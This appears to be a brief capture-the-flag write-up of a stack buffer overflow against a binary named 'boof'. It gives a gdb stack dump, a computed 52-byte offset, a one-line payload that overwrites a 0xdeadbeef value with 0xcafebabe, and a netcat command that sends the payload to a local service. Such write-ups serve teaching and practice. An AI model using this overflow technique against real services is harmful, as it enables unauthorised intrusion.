
First run inspecting the Stack:

`gdb download/boof`

input: `python3 -c "print('A' * 32)"`

```
>>> x/40wx $esp
0xffffce00:	0x00000000	0xffffd0cb	0x00000002	0x41414141
0xffffce10:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffce20:	0x41414141	0x41414141	0x41414141	0xdb94a000
0xffffce30:	0xf7f93e34	0xffffcf30	0xffffce58	0x565562c5
0xffffce40:	0xdeadbeef	0xf7d7593c	0xf7fbe400	0x565562b3
0xffffce50:	0x00000000	0xffffce70	0x00000000	0xf7d88cb9
0xffffce60:	0x00000000	0x00000000	0xf7da213d	0xf7d88cb9
0xffffce70:	0x00000002	0xffffcf24	0xffffcf30	0xffffce90
0xffffce80:	0xf7f93e34	0x5655629d	0x00000002	0xffffcf24
0xffffce90:	0xf7f93e34	0xffffcf30	0xf7ffcb60	0x00000000
```

starting from `0x41414141`. we want to overwrite the `0xdeadbeef` on the stack with this value: `0xcafebabe`. 

this is the 32 bytes buffer + 20 aditional bytes:

so this is our payload.bin file for the attack input:

`python3 -c 'with open("payload.bin", "wb") as f: f.write(b"A" * 52 + b"\xbe\xba\xfe\xca\n")'`

now we run the vulnerable file with 
(cat payload.bin ; cat) | nc 0 10003


or with the `exploit.py`